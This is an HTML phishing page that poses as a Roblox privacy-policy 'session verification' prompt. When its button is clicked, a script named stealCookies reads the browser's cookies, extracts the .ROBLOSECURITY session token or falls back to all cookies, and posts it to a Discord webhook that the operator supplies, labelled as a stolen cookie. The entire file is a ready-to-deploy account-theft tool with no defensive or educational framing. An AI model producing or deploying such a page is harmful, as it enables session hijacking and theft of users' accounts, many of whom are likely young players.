<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            text-align: center;
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        h1 { margin-bottom: 1rem; }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #009688;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover { background-color: #00796b; }
    </style>
</head>
<body>

<div class="container">
    <h1>Roblox Friend Update</h1>
    <p>We've updated our privacy policy. Please verify your session.</p>
    <button onclick="stealCookies()">Click to Verify</button>
</div>

<script>
    // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

    function sendToDiscord(cookieData) {
        const embed = {
            "embeds": [{
                "title": "New Roblox Cookie Stolen!",
                "description": "```" + cookieData + "```",
                "color": 15158332,
                "footer": {
                    "text": "Roblox Logger"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(embed)
        }).then(response => {
            if (response.ok) {
                alert("Verification successful! You can close this window.");
            } else {
                alert("Error sending data.");
            }
        }).catch(error => {
            console.error("Error:", error);
            alert("Error sending data.");
        });
    }

    function stealCookies() {
        // Get the .ROBLOSECURITY cookie
        const cookies = document.cookie;
        const robloxCookie = cookies.split("; ").find(row => row.startsWith(".ROBLOSECURITY"));
        
        // Fallback to all cookies if .ROBLOSECURITY isn't found (rare, but possible)
        const cookieToSend = robloxCookie || cookies;

        if (cookieToSend) {
            sendToDiscord(cookieToSend);
        } else {
            alert("No Roblox cookie found. Are you logged in?");
        }
    }
</script>

</body>
</html>
